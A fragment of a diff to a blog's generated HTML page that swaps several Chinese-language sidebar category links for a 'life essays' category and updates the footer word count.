-          <li><a class="flat-box" title="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"><div class='name'>数据库</div><div class='badge'>(1)</div></a></li>
-        
-          <li><a class="flat-box" title="/categories/%E7%88%AC%E8%99%AB/" href="/categories/%E7%88%AC%E8%99%AB/"><div class='name'>爬虫</div><div class='badge'>(1)</div></a></li>
-        
-          <li><a class="flat-box" title="/categories/%E7%AC%94%E8%AF%95%E9%9D%A2%E8%AF%95/" href="/categories/%E7%AC%94%E8%AF%95%E9%9D%A2%E8%AF%95/"><div class='name'>笔试面试</div><div class='badge'>(1)</div></a></li>
-        
-          <li><a class="flat-box" title="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%A7%86%E8%A7%89/" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%A7%86%E8%A7%89/"><div class='name'>计算机视觉</div><div class='badge'>(1)</div></a></li>
+          <li><a class="flat-box" title="/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/" href="/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/"><div class='name'>生活随笔</div><div class='badge'>(7)</div></a></li>
         
       </ul>
     </div>
@@ -3328,7 +1654,7 @@ setInterval("createtime()",250);
     ｜
 
     <i class="fas fa-chart-area"></i>
-    <span class="post-count">字数统计：40.4k</span>
+    <span class="post-count">字数统计：40.1k</span>
   </div>
 </footer>
 <script>setLoadingBarProgress(80);</script>
